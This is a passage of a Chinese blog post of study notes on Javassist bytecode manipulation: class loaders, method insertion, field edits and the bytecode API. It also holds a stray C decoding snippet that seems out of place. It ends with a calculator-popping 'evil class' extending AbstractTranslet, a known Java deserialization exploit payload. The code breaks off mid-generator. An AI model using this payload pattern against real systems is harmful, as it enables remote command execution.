PL。<strong>你必须避免两个类加载器重复加载相同的类</strong>。两个加载器中的一个必须委派给另一个。</p><p>如果在加载 Point 时 L 没有委派给 PL，则 widthIs() 将抛出 ClassCastException。由于 Box 的真实加载器是 PL，在 Box 中引用的 Point 也由 PL 加载。因此，getSize() 的结果是由 PL 加载的 Point 实例，而 widthIs() 中变量 p 的类型是由 L 加载的 Point。JVM 视它们为不同的类型，因此会因类型不匹配而抛出异常。</p><p>这种行为有点不方便，但是是必要的。如果以下语句：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Point p <span class="hljs-operator">=</span> box.getSize()<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>没有抛出异常，那么 Window 的程序员可以破坏 Point 对象的封装。例如，在由以下定义加载 Point 的 L 中，Point 中的字段 x 是私有的，但是 Window 类可以直接访问 x 的值：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Point</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> x, y;    <span class="hljs-comment">// not private</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">getX</span>()</span> &#123; <span class="hljs-keyword">return</span> x; &#125;<br>        :<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="加载示例"><a href="#加载示例" class="headerlink" title="加载示例"></a>加载示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>pool.appendClassPath(<span class="hljs-string">&quot;E:\\code\\java\\javassist-learn\\com\\y4er\\learn&quot;</span>);<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">PersonClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.y4er.learn.Person&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> PersonClass.toClass().newInstance();<br><span class="hljs-comment">//接下来反射调用</span><br><br></code></pre></td></tr></table></figure><h3 id="通过接口调用-没弄出来"><a href="#通过接口调用-没弄出来" class="headerlink" title="通过接口调用(没弄出来)"></a>通过接口调用(没弄出来)</h3><p>新建一个接口IPerson，将Person类的方法全部抽象出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.y4er.learn;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IPerson</span> &#123;<br>    String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>pool.appendClassPath(<span class="hljs-string">&quot;E:\\code\\java\\javassist-learn\\com\\y4er\\learn\\Person.class&quot;</span>);<br><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">IPerson</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.y4er.learn.IPerson&quot;</span>);<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">Person</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.y4er.learn.Person&quot;</span>);<br>Person.defrost();<br>Person.setInterfaces(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;IPerson&#125;);<br><br><span class="hljs-type">IPerson</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (IPerson) Person.toClass().newInstance();<br>o.setName(<span class="hljs-string">&quot;aaa&quot;</span>);<br>System.out.println(o.getName());<br>o.printName();<br></code></pre></td></tr></table></figure><h2 id="修改现有的类"><a href="#修改现有的类" class="headerlink" title="修改现有的类"></a>修改现有的类</h2><h3 id="实现切片"><a href="#实现切片" class="headerlink" title="实现切片"></a>实现切片</h3><p>javassist大多数情况下用户修改已有的类，比如常见的日志切面。我仍然使用Person类来讲解：</p><p>此时我想在printName方法的执行效果如下</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">------</span> <span class="hljs-comment">printName start</span> <span class="hljs-literal">------</span><br><span class="hljs-comment">xiaoming</span><br><span class="hljs-literal">------</span> <span class="hljs-comment">printName  over</span> <span class="hljs-literal">------</span><br><br></code></pre></td></tr></table></figure><p>写一下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> modify;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Modify</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.appendClassPath(<span class="hljs-string">&quot;D:\\Code_Project\\Java\\Javasist\\first_learn1&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">Person</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;Person&quot;</span>);<br>        Person.defrost();<br><br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">printName1</span> <span class="hljs-operator">=</span> Person.getDeclaredMethod(<span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-literal">null</span>);<br>        printName1.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;------ printName start ------\&quot;);&quot;</span>);<br>        printName1.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;------ printName  over ------\&quot;);&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> Person.toClass().newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printName2</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>        printName2.invoke(o, <span class="hljs-literal">null</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>很轻松实现了切面</p><h3 id="实现修改字段"><a href="#实现修改字段" class="headerlink" title="实现修改字段"></a>实现修改字段</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> modify;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Modify</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.appendClassPath(<span class="hljs-string">&quot;D:\\Code_Project\\Java\\Javasist\\first_learn1&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">Person</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;Person&quot;</span>);<br><br><br><span class="hljs-comment">//        CtMethod printName1 = Person.getDeclaredMethod(&quot;printName&quot;, null);</span><br><span class="hljs-comment">//        printName1.insertBefore(&quot;System.out.println(\&quot;------ printName start ------\&quot;);&quot;);</span><br><span class="hljs-comment">//        printName1.insertAfter(&quot;System.out.println(\&quot;------ printName  over ------\&quot;);&quot;);</span><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> Person.toClass().newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printName2</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>        Field name=o.getClass().getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(o,<span class="hljs-string">&quot;lyj&quot;</span>);<br>        printName2.invoke(o, <span class="hljs-literal">null</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230513234728612.png" alt="image-20230513234728612"> </p><h2 id="字节码层面的api"><a href="#字节码层面的api" class="headerlink" title="字节码层面的api"></a>字节码层面的api</h2><p><a href="https://www.javassist.org/html/javassist/bytecode/ClassFile.html">ClassFile (Javassist API)</a></p><h3 id="获取类并将其转化为字节码"><a href="#获取类并将其转化为字节码" class="headerlink" title="获取类并将其转化为字节码"></a>获取类并将其转化为字节码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> bytecode;<br><br><span class="hljs-keyword">import</span> javassist.ByteArrayClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToByteCode</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.appendClassPath(<span class="hljs-string">&quot;D:\\Code_Project\\Java\\Javasist\\first_learn1&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">Person</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;Person&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytecode=Person.toBytecode();<br>        String str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(bytecode));<br>        System.out.println(str);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="白手起家获取类文件"><a href="#白手起家获取类文件" class="headerlink" title="白手起家获取类文件"></a>白手起家获取类文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassFile</span> <span class="hljs-variable">cf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassFile</span>(<span class="hljs-literal">false</span>, <span class="hljs-string">&quot;test.Foo&quot;</span>, <span class="hljs-literal">null</span>);<br>cf.setInterfaces(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;java.lang.Cloneable&quot;</span> &#125;);<br> <br><span class="hljs-type">FieldInfo</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldInfo</span>(cf.getConstPool(), <span class="hljs-string">&quot;width&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>);<br>f.setAccessFlags(AccessFlag.PUBLIC);<br>cf.addField(f);<br><br>cf.write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;Foo.class&quot;</span>)));<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230514000955812.png" alt="image-20230514000955812"> </p><p>成功创建了Foo.class文件</p><h3 id="添加或者删除一个成员变量"><a href="#添加或者删除一个成员变量" class="headerlink" title="添加或者删除一个成员变量"></a>添加或者删除一个成员变量</h3><p>用addField或者removeField</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> bytecode;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtField;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddRemoveMember</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ClassPool pool=ClassPool.getDefault();<br>        pool.appendClassPath(<span class="hljs-string">&quot;D:\\Code_Project\\Java\\Javasist\\first_learn1&quot;</span>);<br>        CtClass ctclass=pool.get(<span class="hljs-string">&quot;Person&quot;</span>);<br><br>        CtField ctField=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(CtClass.intType,<span class="hljs-string">&quot;mynumber&quot;</span>,ctclass);<br>        ctclass.addField(ctField);<br><br>        CtField ctField1=ctclass.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>        ctclass.removeField(ctField1);<br><br>        ctclass.writeFile(<span class="hljs-string">&quot;D:\\Code_Project\\Java\\Javasist\\src\\test&quot;</span>);<span class="hljs-comment">//将修改完后的字节码输出</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里有一个要注意的点，我们看官方文档可知</p><table><thead><tr><th align="left"><code>java.util.List&lt;FieldInfo&gt;</code></th><th><code>getFields()</code></th><th>Returns all the fields declared in the clas</th></tr></thead><tbody><tr><td align="left">Modifier and Type</td><td>Method</td><td>Description</td></tr></tbody></table><p>getField获得的是一个FieldInfo对象</p><p>而我们用的是ctField，原因在于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CtField</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CtMember</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">javaLangString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.String&quot;</span>;<br>    <span class="hljs-keyword">protected</span> FieldInfo fieldInfo;<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230514141221047.png" alt="image-20230514141221047"> </p><p>修改完后的类成功的按照我们指定的方式</p><h3 id="遍历方法体"><a href="#遍历方法体" class="headerlink" title="遍历方法体"></a>遍历方法体</h3><p>使用<code>CodeIterator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassFile</span> <span class="hljs-variable">cf</span> <span class="hljs-operator">=</span> ... ;<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">minfo</span> <span class="hljs-operator">=</span> cf.getMethod(<span class="hljs-string">&quot;move&quot;</span>);    <span class="hljs-comment">// we assume move is not overloaded.</span><br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">ca</span> <span class="hljs-operator">=</span> minfo.getCodeAttribute();<br><span class="hljs-type">CodeIterator</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> ca.iterator();<br><span class="hljs-type">CodeIterator</span> <span class="hljs-variable">ci</span> <span class="hljs-operator">=</span> ... ;<br><span class="hljs-keyword">while</span> (ci.hasNext()) &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> ci.next();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> ci.byteAt(index);<br>    System.out.println(Mnemonic.OPCODE[op]);<br>&#125;<br></code></pre></td></tr></table></figure><p>他的方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">begin</span><span class="hljs-params">()</span><br><span class="hljs-comment">//Move to the first instruction.</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br><span class="hljs-comment">//Move to the instruction specified by the given index.</span><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span><br><span class="hljs-comment">//Returns true if there is more instructions.</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">next</span><span class="hljs-params">()</span><br><span class="hljs-comment">//Returns the index of the next instruction.</span><br><span class="hljs-comment">//Note that it does not return the opcode of the next instruction.</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">byteAt</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br><span class="hljs-comment">//Returns the unsigned 8bit value at the index.</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">u16bitAt</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br><span class="hljs-comment">//Returns the unsigned 16bit value at the index.</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] code, <span class="hljs-type">int</span> index)</span><br><span class="hljs-comment">//Writes a byte array at the index.</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">byte</span>[] code)</span><br><span class="hljs-comment">//Inserts a byte array at the index. Branch offsets etc. are //automatically adjusted.</span><br></code></pre></td></tr></table></figure><p><a href="https://www.javassist.org/tutorial/tutorial3.html">Javassist Tutorial3</a></p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs prolog">#include&lt;stdio.h&gt;<br>int main(void)<br>&#123;<br>    char v9[<span class="hljs-number">26</span>]; // [esp+<span class="hljs-number">140</span>h] [ebp<span class="hljs-number">-28</span>h]<br>    v9[<span class="hljs-number">0</span>] = <span class="hljs-number">-91</span>;<br>  v9[<span class="hljs-number">1</span>] = <span class="hljs-number">67</span>;<br>  v9[<span class="hljs-number">2</span>] = <span class="hljs-number">83</span>;<br>  v9[<span class="hljs-number">3</span>] = <span class="hljs-number">-108</span>;<br>  v9[<span class="hljs-number">4</span>] = <span class="hljs-number">95</span>;<br>  v9[<span class="hljs-number">5</span>] = <span class="hljs-number">19</span>;<br>  v9[<span class="hljs-number">6</span>] = <span class="hljs-number">-115</span>;<br>  v9[<span class="hljs-number">7</span>] = <span class="hljs-number">64</span>;<br>  v9[<span class="hljs-number">8</span>] = <span class="hljs-number">-106</span>;<br>  v9[<span class="hljs-number">9</span>] = <span class="hljs-number">84</span>;<br>  v9[<span class="hljs-number">10</span>] = <span class="hljs-number">105</span>;<br>  v9[<span class="hljs-number">11</span>] = <span class="hljs-number">83</span>;<br>  v9[<span class="hljs-number">12</span>] = <span class="hljs-number">-113</span>;<br>  v9[<span class="hljs-number">13</span>] = <span class="hljs-number">126</span>;<br>  v9[<span class="hljs-number">14</span>] = <span class="hljs-number">-65</span>;<br>  v9[<span class="hljs-number">15</span>] = <span class="hljs-number">-102</span>;<br>  v9[<span class="hljs-number">16</span>] = <span class="hljs-number">-81</span>;<br>  v9[<span class="hljs-number">17</span>] = <span class="hljs-number">89</span>;<br>  v9[<span class="hljs-number">18</span>] = <span class="hljs-number">83</span>;<br>  v9[<span class="hljs-number">19</span>] = <span class="hljs-number">122</span>;<br>  v9[<span class="hljs-number">20</span>] = <span class="hljs-number">95</span>;<br>  v9[<span class="hljs-number">21</span>] = <span class="hljs-number">-96</span>;<br>  v9[<span class="hljs-number">22</span>] = <span class="hljs-number">-94</span>;<br>  v9[<span class="hljs-number">23</span>] = <span class="hljs-number">105</span>;<br>  v9[<span class="hljs-number">24</span>] = <span class="hljs-number">-9</span>;<br>    v9[<span class="hljs-number">25</span>] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>    for (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">25</span>; i++)<br>    &#123;<br>        v9[i] ^= <span class="hljs-string">&#x27;S&#x27;</span>;<br>    &#125;<br>    for (int i = <span class="hljs-number">24</span>; i &gt;=<span class="hljs-number">0</span>; i--)<br>    &#123;<br>        v9[i] += v9[i+<span class="hljs-number">1</span>];<br>    &#125;<br>    for (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)<br>    &#123;<br>        v9[i] += <span class="hljs-number">30</span>;<br>    &#125;<br>    char v5[] = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;<br>    char v4[] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>    for (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)<br>    &#123;<br>        if (v9[i] == <span class="hljs-string">&#x27;&#123;&#x27;</span> || v9[i] == <span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>        &#123;<br>            continue;<br>        &#125;<br>        <br>            if (v9[i] &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; v9[i] &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>)<br>            &#123;<br>                v9[i] += <span class="hljs-number">1</span>;<br>            &#125;<br>            else if (v9[i] &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; v9[i] &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            &#123;<br>                v9[i] += <span class="hljs-number">1</span>;<br>            &#125;<br>    &#125;<br>    printf(<span class="hljs-string">&quot;%s&quot;</span>,v9);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="我的一些实例项目"><a href="#我的一些实例项目" class="headerlink" title="我的一些实例项目"></a>我的一些实例项目</h2><p>弹计算器的一个恶意类</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.<span class="hljs-type">AbstractTranslet</span>;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EvilClassCalc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    public <span class="hljs-type">EvilClassCalc</span>() &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span>.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-type">Exception</span> var2) &#123;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> evilclass;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> javassist.bytecode.ClassFile;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evilclass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> 